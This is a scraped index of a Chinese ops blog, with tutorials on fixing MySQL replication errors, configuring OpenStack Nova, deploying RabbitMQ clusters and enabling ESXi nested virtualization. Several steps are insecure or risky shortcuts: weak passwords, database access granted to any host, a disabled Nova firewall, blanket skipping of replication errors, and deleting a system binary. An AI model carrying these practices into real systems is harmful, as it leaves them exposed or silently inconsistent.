192.168.10.100 Master_User: slave_user Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000773 Read_Master_Log_Pos: 63325 Relay_Log_File: server122-relay-bin.000002 Relay_Log_Pos: 165661 Relay_Master_Log_File: mysql-bin.000771 Slave_IO_Running: Yes Slave_SQL_Running: No #重点信息1 Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 1062 #重点信息2 Last_Error: Error &#39;Duplicate entry &#39;1438019&#39; for key &#39;PRIMARY&#39;&#39; on query. Default database: &#39;otrs&#39;. Query: &#39;INSERT INTO ticket (tn, title, create_time_unix, queue_id, ticket_lock_id, user_id, group_id, ticket_priority_id, ticket_state_id, ticket_answered, escalation_start_time, timeout, valid_id, create_time, create_by, change_time, change_by) VALUES (&#39;2012061310001851&#39;, &#39;Your order ORD201205A000016 was bounced back&#39;, 1339585744, 44, 1, 43, 1, 3, 4, 0, 1339585744, 0, 1, current_timestamp, 43, current_timestamp, 43)&#39; 解决办法 在从库上执行 1234mysql&gt; slave stop;mysql&gt; set GLOBAL SQL_SLAVE_SKIP_COUNTER&#x3D;1;mysql&gt; slave start;上面的方法可以解决问题,如果问题依旧可以通过以下修改配置文件的方式解决问题。 123456通过修改mysql的配置文件，让从库的同步线程忽略这个错误，方法： 修改mysql配置文件 &#x2F;etc&#x2F;my.cnf 在[mysqld]下加一行:slave_skip_errors &#x3D; 1062 保存.重启mysql从库. 再次查看其状态mysql slave可以正常同步了.","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"MySQL主从库同步错误","slug":"MySQL主从库同步错误","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E%E5%BA%93%E5%90%8C%E6%AD%A5%E9%94%99%E8%AF%AF/"}]},{"title":"OpenStack-Pike-Nova计算服务-计算节点6","slug":"OpenStack-Pike-Nova计算服务-计算节点6","date":"2018-01-05T10:31:27.000Z","updated":"2018-01-15T09:31:08.419Z","comments":true,"path":"2018/01/05/OpenStack-Pike-Nova计算服务-计算节点6/","link":"","permalink":"https://garywu520.github.io/2018/01/05/OpenStack-Pike-Nova%E8%AE%A1%E7%AE%97%E6%9C%8D%E5%8A%A1-%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B96/","excerpt":"在计算节点配置 1在生产环境中可能需要添加N台Nova计算节点来满足工作需要，安装方法与以下方式是一致的。","text":"在计算节点配置 1在生产环境中可能需要添加N台Nova计算节点来满足工作需要，安装方法与以下方式是一致的。 安装nova-computer 1yum install -y openstack-nova-compute 修改配置文件 启用compute和metadata的API 1234vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[DEFAULT]enabled_apis &#x3D; osapi_compute,metadata 配置RabbitMQ 1234vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[DEFAULT]transport_url &#x3D; rabbit:&#x2F;&#x2F;openstack:openstack@192.168.56.11 #修改3128行 配置nova连接到keystone 123456789101112131415vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[api]auth_strategy &#x3D; keystone[keystone_authtoken]auth_uri &#x3D; http:&#x2F;&#x2F;192.168.56.11:5000auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357memcached_servers &#x3D; 192.168.56.11:11211auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultproject_name &#x3D; serviceusername &#x3D; novapassword &#x3D; nova 配置my_ip 123456vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[DEFAULT] my_ip &#x3D; 192.168.56.12注意：这里是计算节点上管理网络接口的IP地址 启用neutron网络配置 12345vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[DEFAULT] use_neutron &#x3D; true firewall_driver &#x3D; nova.virt.firewall.NoopFirewallDriver #关闭Nova防火墙 启用vnc远程控制台访问 123456789vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[vnc]enabled &#x3D; truevncserver_listen &#x3D; 0.0.0.0 #虚拟机迁移时，需要配置为0.0.0.0vncserver_proxyclient_address &#x3D; 192.168.56.12novncproxy_base_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:6080&#x2F;vnc_auto.html 注：novpnproxy我们配置在了控制节点上，所以novncproxy_base_url要填写控制节点IP地址 配置glance 1234vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[glance]api_servers &#x3D; http:&#x2F;&#x2F;192.168.56.11:9292 配置锁路径 1234vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[oslo_concurrency]lock_path &#x3D; &#x2F;var&#x2F;lib&#x2F;nova&#x2F;tmp 配置Placement API 1234567891011vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[placement]os_region_name &#x3D; RegionOneproject_domain_name &#x3D; Defaultproject_name &#x3D; serviceauth_type &#x3D; passworduser_domain_name &#x3D; Defaultauth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357&#x2F;v3username &#x3D; placementpassword &#x3D; placement 检查计算节点是否支持虚拟机硬件虚拟化 123456789101112egrep -c &#39;(vmx|svm)&#39; &#x2F;proc&#x2F;cpuinfo注：如果命令返回结果是0，则说明计算节点服务器BIOS中没开启CPU虚拟化或硬件不支持虚拟化，这时候就无法使用KVM虚拟化技术。虚拟机测试的时候，计算节点需要增加qemu虚拟化配置，否则会卡在GRUB启动界面。vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[libvirt]virt_type &#x3D; qemu重启服务systemctl restart libvirtd.service openstack-nova-compute.service 启动服务 12systemctl enable libvirtd.service openstack-nova-compute.servicesystemctl start libvirtd.service openstack-nova-compute.service 故障排查 12345如果compute服务启动失败，可查看日志报错解决。目录: &#x2F;var&#x2F;log&#x2F;nova&#x2F;nova-compute.log 排错：AMQP server on 10.0.10.11:5672 is unreachable这个错误可能的原因为控制节点的RabbitMQ服务宕机，其次可能是因为控制节点开启了防火墙。 在控制节点验证计算节点配置1source &#x2F;scripts&#x2F;admin-openrc 验证 12345确认是否可以发现计算主机openstack compute service list --service nova-compute发现计算主机su -s &#x2F;bin&#x2F;sh -c &quot;nova-manage cell_v2 discover_hosts --verbose&quot; nova 配置控制节点的nova实现自动识别compute计算主机 123456必须配置，否则计算节点重启就失联了。。。切记！vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[scheduler]discover_hosts_in_cells_interval &#x3D; 300 1234最后重启控制节点nova服务systemctl restart openstack-nova-api.service \\openstack-nova-consoleauth.service openstack-nova-scheduler.service \\openstack-nova-conductor.service openstack-nova-novncproxy.service 安装kvm工具 123456openstack底层调用kvm去创建虚拟机，所以安装kvm必要工具可以从底层很方便的对虚拟机进行管理安装yum install -y qemu-kvm virt-install注：libvirt是目前使用最为广泛的对KVM虚拟机进行管理的工具和API。Libvirtd是一个daemon进程，可以被本地的virsh调用，也可以被远程的virsh调用，Libvirtd调用qemu-kvm操作虚拟机。 具体管理参考：OpenStack手动创建镜像","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"Nova","slug":"Nova","permalink":"https://garywu520.github.io/tags/Nova/"}]},{"title":"RabbitMQ集群部署","slug":"RabbitMQ集群部署","date":"2018-01-05T03:52:31.000Z","updated":"2018-01-19T06:04:46.358Z","comments":true,"path":"2018/01/05/RabbitMQ集群部署/","link":"","permalink":"https://garywu520.github.io/2018/01/05/RabbitMQ%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/","excerpt":"RabbitMQ集群部署 环境","text":"RabbitMQ集群部署 环境 123456789主机名如下：10.0.10.21 rabbitmq110.0.10.22 rabbitmq210.0.10.23 rabbitmq3vim &#x2F;etc&#x2F;hosts10.0.10.21 rabbitmq110.0.10.22 rabbitmq210.0.10.23 rabbitmq3 在这三台机器上部署RabbitMQ 参考：RabbitMQ原理与单机部署 首先启动rabbitmq1上启动服务 12用来生成.erlang.cookie文件[root@rabbitmq1 ~]# rabbitmq-server -detached 读取其中一个节点的cookie,并复制到其他节点 12345678erlang.cookie是erlang实现分布式的必要文件，erlang分布式的每个节点上要保持相同的.erlang.cookie文件，同时保证文件的权限是400。cookie存放在&#x2F;var&#x2F;lib&#x2F;rabbitmq&#x2F;.erlang.cookie或者$HOME&#x2F;.erlang.cookie中。我文件位置在$HOME&#x2F;.erlang.cookie[root@rabbitmq1 ~]# scp .erlang.cookie root@10.0.10.22:&#x2F;root[root@rabbitmq1 ~]# scp .erlang.cookie root@10.0.10.23:&#x2F;root注：cookie相当于令牌，集群中的RabbitMQ节点需要通过交换密钥令牌获得相互认证 逐个启动节点 1rabbitmq-server -detached #以守护方式运行rabbitmq-server 服务开机启动 1略 验证各节点状态 12rabbitmqctl status #验证单个服务rabbitmqctl cluster_status #验证集群,可以看到目前仍是单节点集群状态。 使用rabbitmqctl方式配置集群 以rabbitmq1为主节点 12345678rabbitmq2上操作如下：rabbitmqctl stop_app rabbitmqctl reset rabbitmqctl join_cluster rabbit@rabbitmq1 rabbitmqctl start_app 注：rabbit为RabbitMQ具有管理权限的管理用户 123456rabbitmq3上操作如下：rabbitmqctl stop_app rabbitmqctl reset rabbitmqctl join_cluster rabbit@rabbitmq1 rabbitmqctl start_app 验证RabbitMQ集群 123456789rabbitmqctl cluster_status 查看集群的状态信息出现类似以下信息说明成功：Cluster status of node rabbit@rabbitmq1 ...[&#123;nodes,[&#123;disc,[rabbit@rabbitmq1,rabbit@rabbitmq2,rabbit@rabbitmq3]&#125;]&#125;, &#123;running_nodes,[rabbit@rabbitmq3,rabbit@rabbitmq2,rabbit@rabbitmq1]&#125;, &#123;cluster_name,&lt;&lt;&quot;rabbit@rabbitmq1&quot;&gt;&gt;&#125;, &#123;partitions,[]&#125;, &#123;alarms,[&#123;rabbit@rabbitmq3,[]&#125;,&#123;rabbit@rabbitmq2,[]&#125;,&#123;rabbit@rabbitmq1,[]&#125;]&#125;] 注：如果关闭了集群中的所有节点，则需要确保在启动的时候最后关闭的那个节点是第一个启动的。 RabbitMQ集群节点类型 12345678910共分为2种：磁盘节点和内存节点。内存节点将所有的队列、交换器、绑定关系、用户、权限等元数据信息存储在内存中（提高性能,重启丢失），而磁盘节点则将这些信息存储在硬盘中。rabbitmq默认创建的是硬盘节点，而且它要求集群中至少有一个磁盘节点，所有其他节点都可以是内存节点，但为了可靠性可以配置为至少2个磁盘节点或都为磁盘节点。rabbitmqctl cluster_status命令结果中，disc表示磁盘节点，ram表示内存节点。- 节点加入集群时指定为内存节点 rabbitmqctl join_cluster rabbit@rabbitmq1 --ram- 已加入集群的节点更改节点类型为内存节点 rabbitmqctl stop_app rabbitmqctl change_cluster_node_type ram rabbitmqctl start_app rabbitmqctl cluster_status 从集群中剔除单个节点 123456789101112131415- 正常方式剔除单个节点 rabbitmqctl stop_app rabbitmqctl reset rabbitmqctl start_app 注：rabbitmqctl reset命令将清空节点状态,并将其恢复到空白状态。- 如果集群所有节点非正常关闭，最后一个关闭的节点因某些异常而导致无法启动，则可以通过以下命令将此节点剔除当前集群。 举例：集群中节点按照node3、node2、node1的顺序关闭,此时如果要启动集群，需要先启动node1 [node3]# rabbitmqctl stop [node2]# rabbitmqctl stop [node1]# rabbitmqctl stop 此时在node2节点中把node1节点剔除当前集群 [node2]# rabbitmqctl forget_cluster_node rabbit@node1 --offline [node2]# rabbitmq-server -detached [node2]# rabbitmqctl cluster_status 查看服务日志 1RabbitMQd 日志默认存放在 $RABBITMQ_HOME&#x2F;var&#x2F;log&#x2F;rabbitmq目录内,一般会出现两个log文件 RabbitMQ镜像队列 1234567891011121314151617配置所有节点镜像队列rabbitmqctl set_policy ha-all &quot;^&quot; &#39;&#123;&quot;ha-mode&quot;:&quot;all&quot;&#125;&#39;配置完成后，通过访问Web页面的Exchanges查看-----------------------------------参考------------------------------------------配置镜像队列rabbitmqctl set_policy --priority 0 --apply-to queues mirror_queue \\&quot;^queue_&quot; &#39;&#123;&quot;ha-mode&quot;:&quot;exactly&quot;,&quot;ha-params&quot;:2,&quot;ha-sync-mode&quot;:&quot;automatic&quot;&#125;&#39;参数解释：ha-mode: 指明镜像队列的模式,有效值为all,exactly,nodes,默认为all all表示在集群所有节点上进行镜像; exactly表示在指定个数的节点上进行镜像,节点个数由ha-params指 定；nodes表示在指定的节点上进行镜像，节点名称通过ha-params指定，节点名称通常类似于 rabbit@hostname,可通过rabbitmqctl cluster_status命令获取节点名称。ha-params：配合ha-mode镜像模式进行赋值ha-sync-mode: 队列中消息的同步方式,有效值为automatic和manual。当ha-sync-mode设置为automatic时，新加入的slave会默认同步已知的镜像队列。 启用RabbitMQ插件 rabbitmq1启用网页插件 1234mkdir -p &#x2F;etc&#x2F;rabbitmq #防报错rabbitmq-plugins enable rabbitmq_management #启用网页管理插件,网页管理端口:15672访问http:&#x2F;&#x2F;10.0.10.21:15672即可, 默认用户guest 密码guest rabbitmq1添加远程访问用户,这里创建一个openstack用户 123456789101112默认网页是不允许访问的，需要增加一个用户修改一下权限，代码如下：添加用户openstackrabbitmqctl add_user openstack password添加权限rabbitmqctl set_permissions -p &quot;&#x2F;&quot; openstack &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;修改用户角色rabbitmqctl set_user_tags openstack administrator然后就可以远程访问了，然后可直接配置用户权限等信息。 Web访问查看rabbitmq集群 1234使用openstack用户再次访问http:&#x2F;&#x2F;10.0.10.21:15672注: 如果在Web Overview中的Nodes部分看到“Node statistics not available”的信息，说明在该节点上web管理插件还未启用。在rabbitmq2和rabbitmq3节点上面，分别运行命令即可：rabbitmq-plugins enable rabbitmq_management","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://garywu520.github.io/tags/rabbitmq/"},{"name":"rabbitmq集群","slug":"rabbitmq集群","permalink":"https://garywu520.github.io/tags/rabbitmq%E9%9B%86%E7%BE%A4/"}]},{"title":"RabbitMQ原理与单机部署","slug":"RabbitMQ原理与单机部署","date":"2018-01-04T09:20:34.000Z","updated":"2018-01-19T03:27:01.848Z","comments":true,"path":"2018/01/04/RabbitMQ原理与单机部署/","link":"","permalink":"https://garywu520.github.io/2018/01/04/RabbitMQ%E5%8E%9F%E7%90%86%E4%B8%8E%E5%8D%95%E6%9C%BA%E9%83%A8%E7%BD%B2/","excerpt":"RabbitMQ能做什么 123RabbitMQ是一个消息代理 - 一个消息系统的媒介。它可以为你的应用提供一个通用的消息发送和接收平台，并且保证消息在传输过程中的安全。消息系统允许软件、应用相互连接和扩展．这些应用可以相互链接起来组成一个更大的应用，或者将用户设备和数据进行连接．消息系统通过将消息的发送和接收分离来实现应用程序的异步和解偶。","text":"RabbitMQ能做什么 123RabbitMQ是一个消息代理 - 一个消息系统的媒介。它可以为你的应用提供一个通用的消息发送和接收平台，并且保证消息在传输过程中的安全。消息系统允许软件、应用相互连接和扩展．这些应用可以相互链接起来组成一个更大的应用，或者将用户设备和数据进行连接．消息系统通过将消息的发送和接收分离来实现应用程序的异步和解偶。 技术亮点 1234567891011121314151617181920212223242526272829可靠性RabbitMQ提供了多种技术可以让你在性能和可靠性之间进行权衡。这些技术包括持久性机制、投递确认、发布者证实和高可用性机制。灵活的路由消息在到达队列前是通过交换机进行路由的。RabbitMQ为典型的路由逻辑提供了多种内置交换机类型。如果你有更复杂的路由需求，可以将这些交换机组合起来使用，你甚至可以实现自己的交换机类型，并且当做RabbitMQ的插件来使用。集群在相同局域网中的多个RabbitMQ服务器可以聚合在一起，作为一个独立的逻辑代理来使用。联合对于服务器来说，它比集群需要更多的松散和非可靠链接。为此RabbitMQ提供了联合模型。高可用的队列在同一个集群里，队列可以被镜像到多个机器中，以确保当其中某些硬件出现故障后，你的消息仍然安全。多协议RabbitMQ 支持多种消息协议的消息传递。广泛的客户端只要是你能想到的编程语言几乎都有与其相适配的RabbitMQ客户端。可视化管理工具RabbitMQ附带了一个易于使用的可视化管理工具，它可以帮助你监控消息代理的每一个环节。追踪如果你的消息系统有异常行为，RabbitMQ还提供了追踪的支持，让你能够发现问题所在。插件系统RabbitMQ附带了各种各样的插件来对自己进行扩展。你甚至也可以写自己的插件来使用。 注：官方列举了哪些版本的RabbitMQ兼容固定版本的Erlang。所以为了避免出现兼容性问题，强烈建议下载对应版本。参考：RabbitMQ Erlang Version Requirements 单机部署RabbitMQ 1RabbitMQ是使用Erlang语言编写的一个高可靠消息队列。所以在安装之前，需要下载最新版本的Erlang。 编译安装Erlang 配置Erlang支持SSL 12345678编译升级opensslwget https:&#x2F;&#x2F;www.openssl.org&#x2F;source&#x2F;openssl-1.1.0g.tar.gztar zxvf openssl-1.1.0g.tar.gzyum groupinstall &quot;Development tools&quot;cd openssl-1.1.0g.&#x2F;config --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl编译安装make &amp;&amp; make install 编译报错-解决 1234567编译安装openssl报错：POD document had syntax errors at &#x2F;usr&#x2F;bin&#x2F;pod2man line 69. make: *** [install_docs]解决方法：rm -f &#x2F;usr&#x2F;bin&#x2F;pod2man 重新编译 增加openssl的lib目录到系统里并生效 12echo &#39;&#x2F;usr&#x2F;local&#x2F;openssl&#x2F;lib&#39; &gt;&gt; &#x2F;etc&#x2F;ld.so.conf.d&#x2F;server.confldconfig 123456配置环境变量cat &gt;&gt;&#x2F;etc&#x2F;profile&lt;&lt;EOFexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;openssl&#x2F;binEOFsource &#x2F;etc&#x2F;profile 软链 12mv &#x2F;usr&#x2F;bin&#x2F;openssl &#x2F;usr&#x2F;bin&#x2F;openssl.bakln -s &#x2F;usr&#x2F;local&#x2F;openssl&#x2F;bin&#x2F;openssl &#x2F;usr&#x2F;bin&#x2F;openssl 验证 12[root@localhost ~]# openssl versionOpenSSL 1.1.0g 2 Nov 2017 Erlang下载：http://www.erlang.org/downloads 123456wget http:&#x2F;&#x2F;erlang.org&#x2F;download&#x2F;otp_src_20.2.tar.gztar -zxvf otp_src_20.2.tar.gzcd otp_src_20.2yum install -y ncurses-devel.&#x2F;configure --with-ssl&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;erlangmake &amp;&amp; make install 解决编译错误 1234567891011121314****************************************************************************************** APPLICATIONS DISABLED *******************************************************************************************jinterface : No Java compiler foundodbc : ODBC library - link check failed这里只需关注“ APPLICATIONS DISABLED 部分”,其他两部分是INFO信息不影响编译。(1)&quot;jinterface: No Java compiler found&quot; 添加参数“--without-javac”(2)odbc:ODBC library - link check failed #没有,那就安装 yum install -y unixODBC-devel 重新编译Erlang 123456789101112131415重新编译Erlang.&#x2F;configure --with-ssl&#x3D;&#x2F;usr&#x2F;local&#x2F;openssl --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;erlang --without-javac-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;正常配置完成后会显示如下******************************************************************************************* APPLICATIONS DISABLED *******************************************************************************************jinterface : Java compiler disabled by user-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;编译安装make &amp;&amp; make install 配置环境变量 123456cat &gt;&gt;&#x2F;etc&#x2F;profile&lt;&lt;EOFexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;erlang&#x2F;binEOF让环境变量生效source &#x2F;etc&#x2F;profile 测试Erlang 123456Eshell V5.10.3 (abort with ^G)1&gt; crypto:start().ok2&gt;Erlang退出信号： halt(). 安装simpleJson 下载地址：https://pypi.python.org/pypi/simplejson/ 123tar -zxvf simplejson-3.13.2.tar.gzcd simplejson-3.13.2python setup.py install 部署RabbitMQ 下载地址：http://www.rabbitmq.com/releases/rabbitmq-server/ 1234567推荐用：rabbitmq-server-generic-unix-..*.tar.xz版本wget https:&#x2F;&#x2F;github.com&#x2F;rabbitmq&#x2F;rabbitmq-server&#x2F;releases&#x2F;download&#x2F;v3.7.2&#x2F;rabbitmq-server-generic-unix-3.7.2.tar.xzxz -d rabbitmq-server-generic-unix-3.7.2.tar.xztar -xvf rabbitmq-server-generic-unix-3.7.2.tarmv rabbitmq_server-3.7.2 &#x2F;usr&#x2F;local&#x2F;ln -s &#x2F;usr&#x2F;local&#x2F;rabbitmq_server-3.7.2 &#x2F;usr&#x2F;local&#x2F;rabbitmq #配置文件软链 配置rabbitmq的环境变量 123456cat &gt;&gt;&#x2F;etc&#x2F;profile &lt;&lt;EOFexport PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;rabbitmq&#x2F;sbinEOF环境变量生效source &#x2F;etc&#x2F;profile 正常启动RabbitMQ 1234567rabbitmq-server -datached #启动rabbitmq启动报错: ERROR: epmd error for host controler: address (cannot connect to host&#x2F;port)故障解决： 查看当前hostname，假设是controller，然后修改&#x2F;etc&#x2F;hosts文件，添加一行如下：vim &#x2F;etc&#x2F;hosts127.0.0.1 controller 12345启动验证rabbitmqctl status #查看启动状态ps -ef |grep rabbitmq #查看进程RabbitMQ端口:5672 日志软链 1ln -s &#x2F;usr&#x2F;local&#x2F;rabbitmq&#x2F;var&#x2F;log&#x2F;rabbitmq &#x2F;var&#x2F;log&#x2F;rabbitmq #日志目录软链 管理命令详解 参考: RabbitMQ管理命令详解 配置网页插件 1234mkdir -p &#x2F;etc&#x2F;rabbitmq #防报错rabbitmq-plugins enable rabbitmq_management #启用网页管理插件,网页管理端口:15672访问http:&#x2F;&#x2F;localhost:15672即可, 默认用户guest 密码guest 远程访问配置 123456789101112默认网页是不允许访问的，需要增加一个用户修改一下权限，代码如下：添加用户openstackrabbitmqctl add_user openstack password添加权限rabbitmqctl set_permissions -p &quot;&#x2F;&quot; openstack &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;修改用户角色rabbitmqctl set_user_tags openstack administrator然后就可以远程访问了，然后可直接配置用户权限等信息。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"RabbitMQ","slug":"RabbitMQ","permalink":"https://garywu520.github.io/tags/RabbitMQ/"},{"name":"openssl","slug":"openssl","permalink":"https://garywu520.github.io/tags/openssl/"},{"name":"Erlang","slug":"Erlang","permalink":"https://garywu520.github.io/tags/Erlang/"},{"name":"消息队列","slug":"消息队列","permalink":"https://garywu520.github.io/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"RabbitMQ集群部署","slug":"RabbitMQ集群部署","permalink":"https://garywu520.github.io/tags/RabbitMQ%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/"}]},{"title":"ESXI虚拟机开启CPU虚拟化","slug":"ESXI虚拟机开启CPU虚拟化","date":"2018-01-04T09:17:56.000Z","updated":"2018-01-04T09:20:02.045Z","comments":true,"path":"2018/01/04/ESXI虚拟机开启CPU虚拟化/","link":"","permalink":"https://garywu520.github.io/2018/01/04/ESXI%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%BC%80%E5%90%AFCPU%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"ESXI虚拟机开启KVM虚拟化","text":"ESXI虚拟机开启KVM虚拟化 启用ssh和ESXI Shell 12(1)使用ESXI客户端登陆 -- 配置 -- 安全配置文件 -- 服务 -- 属性 -- 分别开启上面两个服务(2)关闭待虚拟化的虚拟机 SSH登陆ESXI 1ssh ESXI_ServerIP 并输入账号: root和密码登陆 找到对应虚拟机所存储的目录 12虚拟机对应存储的目录可通过ESXI客户端来获取，然后cd到虚拟机所在目录中。一般存储路径在 &#x2F;vmfs&#x2F;volume&#x2F; 目录下 123vi Openstack.vmx #在底部新增如下内容：vhv.enable &#x3D; &quot;TRUE&quot; 启动虚拟机验证 123egrep -c &#39;(vmx|svm)&#39; &#x2F;proc&#x2F;cpuinfo 0表示关闭，非0表示已开启“ESXI”服务器的虚拟化","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ESXI","slug":"ESXI","permalink":"https://garywu520.github.io/tags/ESXI/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"CPU","slug":"CPU","permalink":"https://garywu520.github.io/tags/CPU/"}]},{"title":"OpenStack_Pike-Nova计算服务-控制节点5","slug":"OpenStack-Pike-Nova计算服务-控制节点5","date":"2018-01-03T12:31:45.000Z","updated":"2018-01-12T09:01:59.291Z","comments":true,"path":"2018/01/03/OpenStack-Pike-Nova计算服务-控制节点5/","link":"","permalink":"https://garywu520.github.io/2018/01/03/OpenStack-Pike-Nova%E8%AE%A1%E7%AE%97%E6%9C%8D%E5%8A%A1-%E6%8E%A7%E5%88%B6%E8%8A%82%E7%82%B95/","excerpt":"控制节点和计算节点概念 1控制节点是用来控制虚拟机的，计算节点是专门来运行虚拟机的","text":"控制节点和计算节点概念 1控制节点是用来控制虚拟机的，计算节点是专门来运行虚拟机的 Nova计算服务-分类 Nova API: 负责接收和响应外部请求。支持OpenStack API和EC2 API 1Nova API 对外提供REST API,即HTTP接口。其接收到的请求通过消息队列(RabbitMQ)转发给其他的服务组件。 Nova Cert: 负责EC2身份认证 1当OpenStack与EC2做结合的时候需要使用，所以一般用不上 Nova Scheduler: 用于云主机调度 123Nova Scheduler模块作用：决策虚拟机创建在哪个主机（计算节点）上。决策一个虚拟机应该调度到某物理节点，需要分两个步骤：(1) 过滤(Fliter) (2)计算权值（Weight） 123Filter Scheduler首先得到所有（未经过过滤）的主机列表，然后根据过滤属性(或条件)，选择符合条件的计算节点主机。比如：创建2个CPU&#x2F;8G内存&#x2F;100G硬盘的虚拟主机，筛选哪些计算节点有这个资源，就需要进行过滤，即Filter经过主机过滤后，需要对主机进行权值计算，根据策略选择相应的某一台主机。比如：权值计算方式是哪台计算节点的虚拟机最少，就往哪台计算节点机器上分配。 1当创建虚拟机失败的时候，有时候会提示“找不到有效的主机”，这个其实是Nova Scheduler服务返回的错误。有可能是网络问题或镜像问题。所以要清楚是哪个服务找不到有效主机 Conductor: 计算节点访问数据的中间件 1作用：为了防止所有服务都连接到数据库，它认为数据不安全。其他服务要访问数据库必须先经过我这个Conductor服务 Consoleauth: 用于控制台的授权验证 Novncproxy: VNC代理 控制节点nova部署 配置数据库 1注：在openstack Pike版本中，Nova需要三个数据库。一个是nova,另外两个是nova_api和nova_cell0 (注:这里是英文的cell 0) 都需要创建并赋权。 123456789101112131415create database nova;grant all on nova.* to nova@localhost identified by &quot;nova&quot;;grant all on nova.* to nova@&#39;%&#39; identified by &quot;nova&quot;;create database nova_api;grant all on nova_api.* to nova@localhost identified by &quot;nova&quot;;grant all on nova_api.* to nova@&#39;%&#39; identified by &quot;nova&quot;;create database nova_cell0;grant all on nova_cell0.* to nova@localhost identified by &quot;nova&quot;;grant all on nova_cell0.* to nova@&#39;%&#39; identified by &quot;nova&quot;;flush privileges;验证mysql -unova -pnova -e &quot;show databases;&quot; 配置nova用户并加入到service项目中 1source &#x2F;scripts&#x2F;admin-openrc 创建nova用户(密码:nova) 1openstack user create --domain default --password-prompt nova 将用户同时加入到admin角色和service项目中 1openstack role add --project service --user nova admin 创建一个名字为nova,类型为compute的服务 1openstack service create --name nova --description &quot;OpenStack Compute&quot; compute 12345注册三个API endpoint（nova监听的端口为8774&#x2F;目前的版本为V2.1）openstack endpoint create --region RegionOne compute public http:&#x2F;&#x2F;192.168.56.11:8774&#x2F;v2.1openstack endpoint create --region RegionOne compute internal http:&#x2F;&#x2F;192.168.56.11:8774&#x2F;v2.1openstack endpoint create --region RegionOne compute admin http:&#x2F;&#x2F;192.168.56.11:8774&#x2F;v2.1 创建placement用户(密码：placement) 1openstack user create --domain default --password-prompt placement 将placement加入到admin角色和service服务中 1openstack role add --project service --user placement admin 创建placement服务 1openstack service create --name placement --description &quot;Placement API&quot; placement 12345注册三个Placement API endpoint（placement监听的端口为8778）openstack endpoint create --region RegionOne placement public http:&#x2F;&#x2F;192.168.56.11:8778openstack endpoint create --region RegionOne placement internal http:&#x2F;&#x2F;192.168.56.11:8778openstack endpoint create --region RegionOne placement admin http:&#x2F;&#x2F;192.168.56.11:8778 验证 12openstack service listopenstack endpoint list 安装配置控制节点nova 12345#安装控制节点所需组件yum install -y openstack-nova-api openstack-nova-conductor \\ openstack-nova-console openstack-nova-novncproxy \\ openstack-nova-scheduler openstack-nova-placement-api 开启compute和metadata的API 1234vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[DEFAULT]enabled_apis &#x3D; osapi_compute,metadata 配置nova连接到数据库 1234567vim 